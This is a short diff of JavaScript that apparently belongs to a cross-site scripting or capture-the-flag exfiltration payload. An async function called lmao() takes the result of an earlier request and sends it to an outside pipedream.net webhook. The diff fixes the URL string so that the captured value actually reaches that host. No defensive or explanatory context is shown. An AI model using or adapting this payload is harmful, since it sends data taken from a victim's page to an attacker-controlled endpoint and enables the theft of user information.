@@ -16,7 +16,7 @@
           src = req.statusText;
         }
         var req_webhook = new XMLHttpRequest();
-        req_webhook.open('GET', 'https://en54ypp3nacrf.x.pipedream.net/?src=${src}', true);
+        req_webhook.open('GET', 'https://en54ypp3nacrf.x.pipedream.net/?src='+src, true);
         await req_webhook.send(src);
       }
       lmao()
